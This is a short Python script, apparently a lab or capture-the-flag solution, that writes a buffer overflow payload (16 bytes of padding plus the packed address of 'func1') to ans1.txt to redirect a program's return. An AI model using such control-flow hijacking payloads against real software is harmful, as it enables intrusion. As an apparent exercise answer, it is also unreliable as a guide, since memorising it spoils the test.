import struct

# Use 16 bytes of padding to reach the return address
padding = b"A" * 16

# Target address of func1: 0x401216
# Packed as a 64-bit little-endian value
target_addr = struct.pack("<Q", 0x401216)

# Combine and write to file
payload = padding + target_addr

with open("ans1.txt", "wb") as f:
    f.write(payload)

print("Payload generated: ans1.txt")